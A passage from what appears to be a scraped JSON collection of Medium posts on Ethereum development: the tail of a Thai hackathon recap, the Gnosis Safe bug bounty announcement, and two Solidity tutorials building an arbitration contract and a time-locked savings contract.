\u0e42\u0e14\u0e22\u0e43\u0e0a\u0e49\u0e04\u0e38\u0e13\u0e2a\u0e21\u0e1a\u0e31\u0e15\u0e34 Distributed ledger \u0e41\u0e25\u0e30 Immutable \u0e21\u0e32\u0e0a\u0e48\u0e27\u0e22\u0e25\u0e14\u0e23\u0e30\u0e22\u0e30\u0e40\u0e27\u0e25\u0e32\u0e43\u0e19\u0e01\u0e32\u0e23\u0e17\u0e33\u0e18\u0e38\u0e23\u0e01\u0e23\u0e23\u0e21 \u0e40\u0e1e\u0e34\u0e48\u0e21\u0e04\u0e27\u0e32\u0e21\u0e16\u0e39\u0e01\u0e15\u0e49\u0e2d\u0e07,\u0e25\u0e14 Document process \u0e41\u0e25\u0e30\u0e19\u0e33\u0e2b\u0e25\u0e31\u0e01\u0e01\u0e32\u0e23 Digital Identity \u0e21\u0e32\u0e0a\u0e48\u0e27\u0e22\u0e22\u0e37\u0e19\u0e22\u0e31\u0e19\u0e15\u0e31\u0e27\u0e15\u0e19\u0e43\u0e19\u0e01\u0e32\u0e23\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23\u0e2a\u0e34\u0e19\u0e04\u0e49\u0e32\u0e01\u0e25\u0e38\u0e48\u0e21\u0e40\u0e01\u0e21\u0e40\u0e28\u0e23\u0e29\u0e10\u0e35 online\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e40\u0e01\u0e21\u0e40\u0e28\u0e23\u0e29\u0e10\u0e35 \u0e1a\u0e19 Blockchain \u0e42\u0e14\u0e22\u0e19\u0e33\u0e2b\u0e25\u0e31\u0e01\u0e01\u0e32\u0e23 Smart Contract \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e0a\u0e48\u0e27\u0e22\u0e01\u0e32\u0e23\u0e1e\u0e34\u0e08\u0e32\u0e23\u0e13\u0e32\u0e40\u0e07\u0e37\u0e48\u0e2d\u0e19\u0e44\u0e02\u0e01\u0e32\u0e23\u0e43\u0e2b\u0e49\u0e23\u0e32\u0e07\u0e27\u0e31\u0e25 (\u0e1c\u0e48\u0e32\u0e19 Ethereum coin)\u0e01\u0e25\u0e38\u0e48\u0e21 SET KYC\u0e1e\u0e31\u0e12\u0e19\u0e32 \u0e23\u0e30\u0e1a\u0e1a KYC (Know Your Customer) \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e0a\u0e48\u0e27\u0e22\u0e43\u0e19\u0e01\u0e32\u0e23\u0e1e\u0e34\u0e08\u0e32\u0e23\u0e13\u0e32 \u0e01\u0e32\u0e23\u0e40\u0e02\u0e49\u0e32\u0e23\u0e48\u0e27\u0e21\u0e01\u0e2d\u0e07\u0e17\u0e38\u0e19\u0e2f\u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e44\u0e14\u0e49\u0e2b\u0e31\u0e27\u0e02\u0e49\u0e2d Project \u0e01\u0e31\u0e19\u0e41\u0e25\u0e49\u0e27 \u0e01\u0e47\u0e44\u0e14\u0e49\u0e40\u0e27\u0e25\u0e32\u0e40\u0e25\u0e37\u0e2d\u0e01 Platform \u0e42\u0e14\u0e22\u0e17\u0e35\u0e21\u0e21\u0e35\u0e40\u0e07\u0e37\u0e48\u0e2d\u0e19\u0e44\u0e02\u0e01\u0e32\u0e23\u0e40\u0e25\u0e37\u0e2d\u0e01\u0e43\u0e0a\u0e49 \u0e14\u0e31\u0e07\u0e19\u0e35\u0e49\u0e40\u0e27\u0e25\u0e32\u0e08\u0e33\u0e01\u0e31\u0e14 (\u0e40\u0e1e\u0e35\u0e22\u0e07 32 \u0e0a\u0e21.)implement \u0e07\u0e48\u0e32\u0e22 (\u0e40\u0e2d\u0e32\u0e40\u0e02\u0e49\u0e32\u0e08\u0e23\u0e34\u0e07 \u0e44\u0e21\u0e48\u0e07\u0e48\u0e32\u0e22\u0e40\u0e25\u0e22 \u0e40\u0e2b\u0e2d\u0e30\u0e46)\u0e23\u0e30\u0e1a\u0e1a\u0e44\u0e21\u0e48\u0e0b\u0e31\u0e1a\u0e0b\u0e49\u0e2d\u0e19\u0e21\u0e32\u0e01\u0e14\u0e31\u0e07\u0e02\u0e49\u0e2d\u0e08\u0e33\u0e01\u0e31\u0e14\u0e02\u0e49\u0e32\u0e07\u0e15\u0e49\u0e19 \u0e17\u0e38\u0e01\u0e46\u0e17\u0e35\u0e21 \u0e08\u0e36\u0e07\u0e40\u0e25\u0e37\u0e2d\u0e01\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e23\u0e30\u0e1a\u0e1a\u0e2f \u0e42\u0e14\u0e22\u0e43\u0e0a\u0e49 Ethereum PlatformSprint Planning\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e44\u0e14\u0e49 Productivity \u0e17\u0e35\u0e48\u0e2a\u0e39\u0e07\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14 \u0e08\u0e36\u0e07\u0e40\u0e25\u0e37\u0e2d\u0e01\u0e43\u0e0a\u0e49 Agile development process\u0e14\u0e49\u0e27\u0e22\u0e01\u0e32\u0e23\u0e17\u0e33 Scrum \u0e21\u0e32\u0e43\u0e0a\u0e49 \u0e41\u0e22\u0e01\u0e40\u0e1b\u0e47\u0e19 4 Sprint , Sprint \u0e25\u0e30 4 \u0e0a\u0e31\u0e48\u0e27\u0e42\u0e21\u0e07 (\u0e17\u0e49\u0e32\u0e17\u0e32\u0e22\u0e2a\u0e38\u0e14\u0e46)\u0e17\u0e33 Daily Scrum \u0e40\u0e1e\u0e37\u0e48\u0e2d sync \u0e01\u0e31\u0e1a teamUI/UX ,S/W Design , R&D \u0e2d\u0e22\u0e48\u0e32\u0e07\u0e02\u0e30\u0e21\u0e31\u0e01\u0e40\u0e02\u0e21\u0e49\u0e19 (\u0e08\u0e23\u0e34\u0e07\u0e46\u0e19\u0e30)\u0e20\u0e32\u0e29\u0e32 Solidity \u0e40\u0e1b\u0e47\u0e19\u0e20\u0e32\u0e29\u0e32\u0e43\u0e2b\u0e21\u0e48 \u0e17\u0e35\u0e48\u0e22\u0e31\u0e07\u0e21\u0e35\u0e02\u0e49\u0e2d\u0e08\u0e33\u0e01\u0e31\u0e14\u0e2d\u0e22\u0e39\u0e48\u0e21\u0e32\u0e01 \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e33 Research & Development \u0e44\u0e1b\u0e14\u0e49\u0e27\u0e22 (\u0e2b\u0e19\u0e49\u0e32\u0e08\u0e2d \u0e43\u0e04\u0e23\u0e04\u0e49\u0e32\u0e07 Fb \u0e44\u0e27\u0e49\u0e40\u0e19\u0e35\u0e48\u0e22\u0e22)\u0e17\u0e33 World Cafe \u0e01\u0e31\u0e19\u0e40\u0e2a\u0e21\u0e2d\u0e46\u0e40\u0e1e\u0e37\u0e48\u0e2d share \u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49 \u0e23\u0e27\u0e21\u0e16\u0e36\u0e07\u0e40\u0e2a\u0e19\u0e2d\u0e41\u0e19\u0e30 \u0e41\u0e25\u0e30\u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e19\u0e41\u0e01\u0e49\u0e1b\u0e31\u0e0d\u0e2b\u0e32\u0e17\u0e32\u0e07\u0e40\u0e17\u0e04\u0e19\u0e34\u0e04\u0e2d\u0e35\u0e01\u0e17\u0e31\u0e49\u0e07\u0e17\u0e38\u0e01\u0e46 \u0e0a\u0e31\u0e48\u0e27\u0e42\u0e21\u0e07 \u0e40\u0e23\u0e32\u0e08\u0e30\u0e25\u0e38\u0e01\u0e02\u0e36\u0e49\u0e19 \u0e22\u0e37\u0e14\u0e40\u0e2a\u0e49\u0e19\u0e22\u0e37\u0e19\u0e2a\u0e32\u0e22 \u0e2d\u0e2d\u0e01\u0e01\u0e33\u0e07\u0e01\u0e32\u0e22 \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e44\u0e21\u0e48\u0e43\u0e2b\u0e49\u0e40\u0e2a\u0e49\u0e19\u0e22\u0e36\u0e14(\u0e2e\u0e32\u0e32) \u0e1a\u0e23\u0e23\u0e22\u0e32\u0e01\u0e32\u0e28\u0e17\u0e38\u0e01\u0e46\u0e04\u0e19 \u0e21\u0e38\u0e48\u0e07\u0e21\u0e31\u0e48\u0e19\u0e21\u0e32\u0e01\u0e46Sprint 2 \u0e40\u0e23\u0e34\u0e48\u0e21\u0e07\u0e48\u0e27\u0e07 \u0e2b\u0e31\u0e27\u0e40\u0e23\u0e34\u0e48\u0e21\u0e15\u0e37\u0e49\u0e2d \u0e2d\u0e32\u0e01\u0e32\u0e28\u0e40\u0e23\u0e34\u0e48\u0e21\u0e2b\u0e19\u0e32\u0e27 \u0e1c\u0e49\u0e32\u0e2b\u0e48\u0e21 \u0e15\u0e38\u0e4a\u0e01\u0e15\u0e38\u0e48\u0e19 \u0e15\u0e38\u0e4a\u0e01\u0e15\u0e32 \u0e16\u0e38\u0e07\u0e19\u0e2d\u0e19 \u0e16\u0e39\u0e01\u0e19\u0e33\u0e2d\u0e2d\u0e01\u0e21\u0e32\u0e43\u0e0a\u0e49 \u0e01\u0e31\u0e19\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e16\u0e49\u0e27\u0e19\u0e2b\u0e19\u0e49\u0e32\u0e41\u0e25\u0e30\u0e41\u0e25\u0e49\u0e27 \u0e01\u0e47\u0e16\u0e36\u0e07\u0e40\u0e27\u0e25\u0e32 \u0e2a\u0e23\u0e38\u0e1b\u0e07\u0e32\u0e19 \u0e41\u0e25\u0e30 Present ProductLive Presentation VDO \u0e14\u0e39\u0e17\u0e35\u0e48\u0e19\u0e35\u0e48\u0e2a\u0e23\u0e38\u0e1b\u0e07\u0e32\u0e19\u0e19\u0e35\u0e49\u0e1a\u0e2d\u0e01\u0e15\u0e32\u0e21\u0e15\u0e23\u0e07 \u0e27\u0e48\u0e32\u0e40\u0e02\u0e49\u0e32\u0e1f\u0e31\u0e07 Concept \u0e2d\u0e22\u0e48\u0e32\u0e07\u0e40\u0e14\u0e35\u0e22\u0e27\u0e04\u0e07\u0e44\u0e21\u0e48\u0e21\u0e35\u0e17\u0e32\u0e07\u0e40\u0e02\u0e49\u0e32\u0e43\u0e08\u0e41\u0e01\u0e48\u0e19\u0e41\u0e17\u0e49 \u0e02\u0e2d\u0e07 Blockchain \u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e25\u0e07\u0e21\u0e37\u0e2d\u0e17\u0e33 \u0e25\u0e2d\u0e07\u0e1c\u0e34\u0e14\u0e25\u0e2d\u0e07\u0e16\u0e39\u0e01 \u0e41\u0e25\u0e30\u0e19\u0e33\u0e21\u0e31\u0e19\u0e21\u0e32\u0e43\u0e0a\u0e49\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e2a\u0e21\u0e40\u0e2b\u0e15\u0e2a\u0e21\u0e1c\u0e25 \u0e21\u0e35 Business case \u0e23\u0e2d\u0e07\u0e23\u0e31\u0e1a\u0e42\u0e14\u0e22\u0e23\u0e27\u0e21\u0e41\u0e25\u0e49\u0e27\u0e1c\u0e21\u0e0a\u0e2d\u0e1a\u0e07\u0e32\u0e19\u0e41\u0e1a\u0e1a\u0e19\u0e35\u0e49\u0e04\u0e23\u0e31\u0e1a \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e2b\u0e47\u0e19\u0e02\u0e49\u0e2d\u0e08\u0e33\u0e01\u0e31\u0e14\u0e02\u0e2d\u0e07\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \u0e04\u0e27\u0e32\u0e21\u0e40\u0e2d\u0e37\u0e49\u0e2d\u0e40\u0e1f\u0e37\u0e49\u0e2d\u0e01\u0e31\u0e19 \u0e02\u0e2d\u0e07\u0e1e\u0e35\u0e48\u0e46 \u0e19\u0e49\u0e2d\u0e07\u0e46 \u0e41\u0e21\u0e49\u0e2b\u0e25\u0e32\u0e22\u0e46\u0e17\u0e48\u0e32\u0e19\u0e08\u0e30\u0e44\u0e21\u0e48\u0e23\u0e39\u0e49\u0e08\u0e31\u0e01\u0e01\u0e31\u0e19\u0e21\u0e32\u0e01\u0e48\u0e2d\u0e19 \u0e17\u0e38\u0e01\u0e04\u0e19\u0e21\u0e32\u0e0a\u0e48\u0e27\u0e22\u0e01\u0e31\u0e19 \u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e19\u0e17\u0e33\u0e08\u0e19 Project \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08\u201c\u0e1c\u0e21\u0e17\u0e33 Blockchain \u0e44\u0e14\u0e49\u0e41\u0e25\u0e49\u0e27 !!!\u201d \u0e19\u0e49\u0e33\u0e40\u0e2a\u0e35\u0e22\u0e07\u0e2d\u0e31\u0e19\u0e21\u0e31\u0e48\u0e19\u0e43\u0e08 \u0e16\u0e39\u0e01\u0e40\u0e1b\u0e25\u0e48\u0e07\u0e21\u0e32\u0e08\u0e32\u0e01\u0e17\u0e35\u0e21\u0e07\u0e32\u0e19=====================Appendix : \u0e02\u0e2d\u0e1a\u0e04\u0e38\u0e13\u0e23\u0e39\u0e1b\u0e01\u0e34\u0e08\u0e01\u0e23\u0e23\u0e21 \u0e08\u0e32\u0e01 \u0e04\u0e38\u0e13\u0e23\u0e39\u0e1f https://web.facebook.com/roofimon.class", "responses": 0, "tags": ["Blockchain", "Hackathon", "Ethereum", "Hyperledger", "Solidity"]}, {"title": "Announcing the Gnosis Safe Bug Bounty", "post_link": "https://blog.gnosis.pm/announcing-the-gnosis-safe-bug-bounty-10e147e719c4?source=search_post", "author_name": "Lukas Schor", "author_link": "https://blog.gnosis.pm/@schor", "publish_date": "2019-05-10", "last_modified_date": "2019-05-10", "readtime": "3.71", "claps": 165, "voters": 11, "content": "Announcing the Gnosis Safe Bug BountyFind the bugs, get rewarded. Earn up to $50,000 for every bug you report.Lukas SchorFollowMay 10 \u00b7 4 min readWe\u2019ve already put the Gnosis Safe smart contracts under the microscope of formal verification. Given our confidence in the Gnosis Safe smart contracts\u2019 security, we\u2019ve decided at Gnosis to move our own company funds to the newly formally verified contracts. Our funds will be moved in stages, with the first 5,000 ETH already stored in this Gnosis Safe, a honeypot for hackers.But that\u2019s not all! We are also kicking off a bug bounty program to further audit and secure the Gnosis Safe smart contracts. Earn up to $50,000 for every bug you report.Let\u2019s get right into it\u2026The RulesMany of the Ethereum Foundation\u2019s bug bounty program rules are also applicable for the Gnosis Safe bug bounty program:Issues that have already been submitted by another user or are already known to the Gnosis team are not eligible for bounty rewards.Public disclosure of a vulnerability makes it ineligible for a bounty.The Gnosis core development team, employees, and all other people paid by Gnosis, directly or indirectly (including the external auditor), are not eligible for rewards.The Gnosis Safe bounty program considers a number of variables in determining rewards. Determinations of eligibility, score, and all terms related to an award are at the sole and final discretion of the Gnosis Safe bug bounty panel.The ScopeThe scope of our bug bounty program includes core contracts related to release v1.0.0 of the Gnosis Safe (check out the Readme or the release details for more information).In scope:GnosisSafe.solProxyFactory.solCreateAndAddModules.sol, MultiSend.sol (the only libraries that are part of the bug bounty)Examples of what\u2019s in scope:Being able to steal fundsBeing able to freeze funds or render them inaccessible by their ownersBeing able to perform replay attacksBeing able to change Safe settings without owner consentOut of scope:Any files, modules or libraries other than the ones mentioned aboveMore efficient gas solutionsAny points listed as an already known weaknessesAny points listed in the audit or formal verification results reportIntended behaviorPlease refer to the readme file, the readthedocs and the release details in the repository for an extensive overview of the intended behavior of the smart contracts.CompensationAny bugs \u2014 they do not need to necessarily lead to a redeploy \u2014 will be considered for a bounty. But the severity of the threat will change the reward. Below are the reward levels for each threat severity along with an example of such a threat.High threat: up to $50,000An identified attack that could steal funds or tokens or lock user funds would be considered a high threat. Likewise, a reported bug that, on its own, leads to a redeploy of the code will always be considered a high threat.Medium threat: up to $10,000An identified attack where it is possible to steal funds because of unexpected behavior on the part of the user. Unexpected behavior here means that it is not possible for the user to have a way to see what will happen before the funds are lost.Low threat: up to $2,000A way to avoid transaction fees or in some way compromising the experience of other Safe users.All bounties will be paid in ETH.Please note that the submission\u2019s quality will factor into the level of compensation. A high-quality submission includes an explanation of how the bug can be reproduced, a failing test case, a valid scenario in which the bug can be exploited, and a fix that makes the test case pass. High-quality submissions may be awarded amounts higher than the amounts specified above.Submission ProcessPlease email your submissions to: bounty@gnosis.pmDon\u2019t forget to include your ETH address so you can be rewarded. If more than one address is specified, only one will be used at the discretion of the bounty program administrators.Anonymous submissions are welcome, too.Responsible Disclosure PolicyIf you comply with the policies below when reporting a security issue to us, we will not initiate a lawsuit or law enforcement investigation against you in response to your report.We ask that:You give us reasonable time to investigate and mitigate an issue you report before making public any information about the report or sharing such information with others.You make a good faith effort to avoid privacy violations and disruptions to others, including (but not limited to) destruction of data and interruption or degradation of our services.You do not exploit a security issue you discover for any reason. This includes demonstrating additional risk, such as an attempted compromise of sensitive company data or probing for additional issues.You do not violate any other applicable laws or regulations.Public disclosure of the bug or indication of an intention to exploit it on the mainnet will make the report ineligible for a bounty. If in doubt about other aspects of the bounty, most of the Ethereum Foundation bug bounty program rules will apply here.Any questions? Reach us via email (bounty@gnosis.pm) or Gitter. For more information on the Gnosis Safe, check out our blog and our Github.Honey PotAs mentioned above, we have transferred a significant amount of funds to a Gnosis Safe (5000 ETH), which serves as a honey pot for bounty hunters.At Gnosis, we will gradually move substantial amounts of our company funds into a Gnosis Safe.Happy hunting!\ud83d\udd14 To get future updates, make sure to follow Gnosis and Gnosis Safe on Twitter.", "responses": 0, "tags": ["Bug Bounty", "Ethereum", "Solidity", "Blockchain", "Safe"]}, {"title": "Decide on dinner with an Ethereum arbitration contract", "post_link": "https://medium.com/hackernoon/decide-on-dinner-with-an-ethereum-arbitration-contract-c59c13a28d5?source=search_post", "author_name": "paul christophe", "author_link": "https://medium.com/@captaindaylight", "publish_date": "2017-11-28", "last_modified_date": "2019-04-26", "readtime": "5.00", "claps": 76, "voters": 11, "content": "Decide on dinner with an Ethereum arbitration contractpaul christopheFollowNov 28, 2017 \u00b7 6 min readJack and Jill can\u2019t decide on dinner so they\u2019re bringing in an arbiter to hear their dispute. The problem is they don\u2019t trust the other to independently choose an arbiter.Let\u2019s write an Ethereum contract to handle their dispute!This article assumes you have a basic understanding of Ethereum. If you\u2019re still shaky, start with this fantastic article by Preethi Kasireddy.How Our Contract Will Work1. Person One creates a new arbitration instance and gives it a description. \ud83c\udf1f2. Person One and Person Two submit their differing opinions. \ud83d\ude203. Person One and Person Two also choose an arbiter. The process doesn\u2019t go forward until both agree on the same account address. \ud83d\udc4d4. The arbiter reviews the two points of view and decide the winner. \ud83e\udd14 \u27a1 \ud83c\udfc6SetupFeel free to move to the next section if you\u2019ve run a truffle project beforeWe\u2019ll be using a framework called Truffle to develop our smart contract. It\u2019s a one stop shop for handling compilation, testing, deployment, migrations and much more. We\u2019ll only be using certain features in this post but I encourage you to dig deeper.Before we dive in, globally install truffle and testrpc.npm install -g truffle ethereumjs-testrpcThen, in a new directory run:truffle initYou should see truffle\u2019s folder structure inflate with some simple examples in the contracts/ folder.Get Your Feet WetLet\u2019s get a feel for the workflow.1. Kickstart our test client with testrpc. You\u2019ll see some of the accounts you\u2019ll be using to simulate the interaction:2. In separate tab run truffle compile. This generates a corresponding JSON artifacts from the contracts and drops them into a build folder.3. Now run truffle migrate to generate files to facilitate contract deployment to the blockchain. Important, testrpc must be running when you migrate, otherwise your contracts won\u2019t deploy to that testing instance.4. Run truffle console which will connect to our running Ethereum client and allow us to interact with our contracts.Poke AroundWe\u2019re going to modify one of the existing contracts (technically a library\u2026 works for our purposes though) ConvertLib.sol. It provides a single method to multiply two numbers.A method that changes state on the chain is a transaction (costs gas) while any method that only returns data is a call (free).Truffle\u2019s console has web3 and our contracts ready to go, give it a go:// get the deployed contract by its class name, returns a promise> const contract = ConvertLib.deployed()// invoke the 'convert' method with 'call', also returns a promise> const response = contract.then(c => c.convert.call(5, 20))// print out our result!!> response.then(res => res.toNumber())100Great, we\u2019ve interacted with a deployed contract to multiply two numbers!Let\u2019s Write Some SolidityEthereum contracts are written in a high level language called Solidity. If you\u2019re familiar with Javascript or object oriented programming you\u2019ll notice a lot of similarities.With Solidity we\u2019ll define state variables and establish our rules of arbitration. Afterwards we\u2019ll use Truffle to compile the contract and deploy it to our testing environment. The state and code we define in our contract will then live at a specific address on the Ethereum blockchain.Let\u2019s start by cleaning house. Remove contracts/ConvertLib.sol and contracts/MetaCoin.sol but keep contracts/Migrations.sol so we can perform migrations.Then, create a file in the contracts/ folder called Arbitration.sol. Now go into your migrations/ folder and modify 2_deploy_contracts.js:var Arbitration = artifacts.require('./Arbitration.sol');module.exports = function(deployer) {  deployer.deploy(Arbitration);};Open contracts/Arbitration.sol and begin by defining the solidity version and contract name.You\u2019ll be adding public variables description and winningOpinion as well as the transaction method setDescription to set the description.pragma solidity ^0.4.11;contract Arbitration {  string public description;  string public winningOpinion;  function setDescription(string _description) {    description = _description;  }}Next use the struct type to define how our claimants\u2019 data should look. Then, we\u2019ll use that Claimant type we made to declare an array called claimants. Finally, create a method that adds a new claimant.contract Arbitration {  string public description;  struct Claimant {    string opinion;    address addr;    address arbiter;  }  Claimant[] public claimants;    function setDescription(string _description) {    description = _description;  }  function addClaimant(string opinion, address arbiter) {    if (claimants.length < 2) {      claimants.push(Claimant(opinion, msg.sender, arbiter));      }  }}One thing to note, msg.sender will give us the address of the account sending the addClaimant transaction. msg has other valuable info that it passes along as well.After claimants have added their proposals, the arbiter will be able to review the disagreement by calling getProposals.contract Arbitration {  ...  function getProposals()    returns (      string _description,      string _proposalOne,      string _proposalTwo    )  {    require(claimants.length == 2);    return (      description,      claimants[0].opinion,      claimants[1].opinion    );  }}In the function declaration you\u2019ll see that we define what will be returned with the returns keyword. We use require to allow the code to continue only if two claimants have submitted.Next, we\u2019ll create a method that allows only the arbiter to choose a winner. First we\u2019ll create a helper method verifyArbiter that selectWinner will use. verifyArbiter cycles through the claimants and makes sure that the sender\u2019s address matches what each claimant has selected. If require doesn\u2019t throw an error, it then sets the contract\u2019s state variable winningOpinion.contract Arbitration {  ...  function verifyArbiter() returns (bool isArbiter) {    for (uint i = 0; i < claimants.length; i++) {      if (msg.sender != claimants[i].arbiter) {        return false;      }    }    return true;  }  function selectWinner(uint proposalNumber) {    require(verifyArbiter());    winningOpinion = claimants[proposalNumber].opinion;  }}Interacting With the ContractOpen terminal and run testrpc. Then, in a new tab run truffle compile, truffle migrate and truffle console as we did in the section above. Let\u2019s start by getting a reference to our contract and adding a description to it:> const contract = Arbitration.deployed()> contract.then(c => c.description())''> contract.then(c => c.setDescription('What to eat for dinner'))> contract.then(c => c.description())'What to eat for dinner'As you can see, we can access state by calling the variable name like a function: description().Now, go back to your testrpc output and look at the ten addresses it gives you. Set ARBITER_ADDRESS to any of the addresses in the list other than the first because truffle by default uses the first account as the sender.> contract.then(c => c.addClaimant('burgers', 'ARBITER_ADDRESS'))> contract.then(c => c.claimants(0))[ 'burgers','FIRST_ADDRESS_LISTED','ARBITER_ADDRESS' ]To add the second claimant, we\u2019ll modify how we call the addClaimant method. The last parameter will take another address from the testrpc account list and simulate sending a call from there.> contract.then(c => c.addClaimant('pizza', 'ARBITER_ADDRESS', {from: 'SECOND_CLAIMANT_ADDRESS'}))> contract.then(c => c.claimants(1))[ 'pizza','SECOND_CLAIMANT_ADDRESS','ARBITER_ADDRESS' ]Now imagine the arbiter would like to see the current state of the proposals. Assuming both claimants have voted (otherwise it will throw an error) they\u2019ll get a response like:> contract.then(c => c.getProposals.call())[ 'What to eat for dinner', 'burgers', 'pizza' ]Using the arbiter\u2019s address, let\u2019s select a winner using either 0 for burgers or 1 for pizza.> contract.then(c => c.selectWinner(1, {from: 'ARBITER_ADDRESS'}))After the arbiter has selected a winner, anyone can consult the contract for the winner.> contract.then(c => c.winningOpinion())'pizza'We knew pizza was going to win but writing this contract was nonetheless a fruitful exercise in understanding Ethereum. Check out the code here!", "responses": 0, "tags": ["Ethereum", "Solidity", "JavaScript", "Tutorial", "Tech"]}, {"title": "Making a time savings contract in Ethereum", "post_link": "https://medium.com/coinmonks/making-a-time-savings-contract-in-ethereum-b89cacfdfe4e?source=search_post", "author_name": "Keno Leon", "author_link": "https://medium.com/@k3no", "publish_date": "2017-12-16", "last_modified_date": "2019-07-23", "readtime": "4.97", "claps": 103, "voters": 11, "content": "Making a time savings contract in EthereumOr a modern day Ulysses and the sirens.Keno LeonFollowDec 16, 2017 \u00b7 5 min readLegend has it that Ulysses really wanted to hear some sirens sing, unfortunately they had a tendency to convince the captains and crews of passing ships to steer their vessels into some rocks\u2026 and collect their skulls. Ulysses solution to this problem was to command his crewmen to tie him to the mast so he could enjoy the concert, ( importantly he also instructed them to cover their ears) .Savings accounts present you with a similar problem, let\u2019s say you have some money left from your paycheck in your checking account, you might want to save it for a rainy day or an important future event, but there are sirens everywhere in the form of shinny things you want to spend your money on, so most savings accounts and instruments don\u2019t allow you to withdraw your money after a certain date, they effectively tie you to the mast.We don\u2019t yet have a cryptocurrency bank that offers traditional savings since well, they don\u2019t pay interests, and it\u2019s a descentralized currency,so in the spirit of be \u201c your own bank\u2122 \u201d you can make the best next thing, a contract that will tie you to the mast and lock your Ether for a period of time, I\u2019ll go over the uses & logic later, for now let\u2019s get down to it:The Problem / challenge :Create a contract that locks your funds ( Ether in this case ) and then releses them after a certain time period.The contract :pragma solidity ^ 0.4.0;contract DateTime {        function getYear(uint timestamp) public constant returns (uint16);        function getMonth(uint timestamp) public constant returns (uint8);        function getDay(uint timestamp) public constant returns (uint8);}contract FuturePayable {address private owner;  uint public bday;  uint public payday;address public dateTimeAddr = 0x8Fc065565E3e44aef229F1D06aac009D6A524e82;  DateTime dateTime = DateTime(dateTimeAddr);modifier onlyOwner {    require(msg.sender == owner);    _;  }/*constructor*/  function FuturePayable() public  {    owner = msg.sender;    bday = now;    payday = ( bday + 1 days );  }/* Default function */  function() public payable {  }function withdraw() public onlyOwner {       require (block.timestamp > payday);       msg.sender.transfer(this.balance);   }function getBirthYear() view public returns (uint16){      return dateTime.getYear(bday);  }function getBirthMonth() view public returns (uint8){      return dateTime.getMonth(bday);  }function getBirthDay() view public returns (uint8){      return dateTime.getDay(bday);  }function getPayYear() view public returns (uint16){      return dateTime.getYear(payday);  }function getPayMonth() view public returns (uint8){      return dateTime.getMonth(payday);  }function getPayDay() view public returns (uint8){      return dateTime.getDay(payday);  }}Deploying:Contract Address:0x192c0509fb52ea771bbfc6c99f4aa48b181be9e6https://kovan.etherscan.io/address/0x192c0509fb52ea771bbfc6c99f4aa48b181be9e6We will also send some Ether ( 1 ETH ) :After adding the contract to Parity\u2026If we then try to immediately withdraw, Parity will warn you not to go ahead.But if you do send the transaction, the contract will throw since it\u2019s not ready yet, and you loose a bit of gas\u2026We need to wait for one whole day to retrieve our Ether, we will use that time to explain the contract:function FuturePayable() public  {    owner = msg.sender;    bday = now;    payday = ( bday + 1 days );  }The constructor upon creation sets the relevant dates, and here you can change the duration to something more relevant like 1 months 1 years it also defines an owner.The other relevant bit is this one:function withdraw() public onlyOwner {       require (block.timestamp > payday);       msg.sender.transfer(this.balance);}The first thing to note is that we are checking for ownership via the onlyOwner modifier, we then check that the date is correct with block.timestamp > payday and if so we then send the whole contracts balance upon being called, that\u2019s it.The rest of the contract just adds a payable function and some convenience date getters I covered previously here:https://medium.com/@k3no/making-a-birthday-contract-858fd3f63618A note about working with Timestamps:Our contracts birthday is 1513212652 in Timestamp format.It can also be consulted in human readable form straight from the contract thanks to the use of a Time Date library:getBirthDay    14getBirthMonth    12getBirthYear    2017The gotcha here is that the timestamp has a fixed time zone (UTC), so you would still need to convert it to your local time zone for it to make sense to you or your users.So a day has passed and now is time to call the contract again\u2026This results in the owner account ( K3NOKOVAN ) receiveing (0.99 Ether, see note ) and the contracts balance going back to zero as intended, you can check the tx history for details:https://kovan.etherscan.io/address/0x192c0509fb52ea771bbfc6c99f4aa48b181be9e6Important Note: There are 2 transactions and thus 2 types of fees, the first one originated from the owner account calling the withdraw function:https://kovan.etherscan.io/tx/0xfe63a3a5e22d3a0b505e1157de43dcd5c1912990fabd8fac13268a16336d9343It consumed 30054 wei in Gas.The second one is the one generated by this calls transfer, and it is called an Internal Transaction :https://kovan.etherscan.io/tx/0xfe63a3a5e22d3a0b505e1157de43dcd5c1912990fabd8fac13268a16336d9343#internalIt consumed around 2300 wei in Gas (the limit or stipend for transfers). Both transaction fees were paid by the originating contract (the owner)If you are transferring to the same account from where you are calling, your fees and deposit might be added in parity or other wallets,this is why you might get 0.99 ETH, and not 1 full ETH. Uses.Well, the obvious one is to lock your Ether for a time period, you might want to buy and hodl some Ether for a few months expecting that the price rises, but don\u2019t trust yourself you won\u2019t spend it in some crypto kittens instead, or worse panic sell.Other uses could be financial instruments, escrow services and future contracts.Improving it.While a working example, this is by no means the final word in time savings contracts, a number of improvements could be made, adding an automatic withdrawal, clearer finer date information, make it killable, provide a setter for the time period to name a few.Thanks for reading !Shameless plug: If you are looking for an introduction to Ethereum, Solidity and Smart Contracts I just published an eBook ( and soon a print one ) on getting started:https://www.amazon.com/dp/B078CQ8L7VAbout the Author :Born Eugenio Noyola Leon (Keno) I am a Designer,Web Developer/programmer, Artist and Inventor, currently living in Mexico City, you can find me at www.k3no.com", "responses": 0, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Cryptocurrency", "Blockchain"]}, {"title": "Writing Software Contracts for Ethereum \u2014 Part 2", "post_link": "https://medium.com/coinmonks/writing-software-contracts-for-ethereum-part-2-cfcfae70a20c?source=search_post", "author_name": "Satish Manohar Talim", "author_link": "https://medium.com/@IndianGuru", "publish_date": "2017-08-04", "last_modified_date": "2018-05-19", "readtime": "7.37", 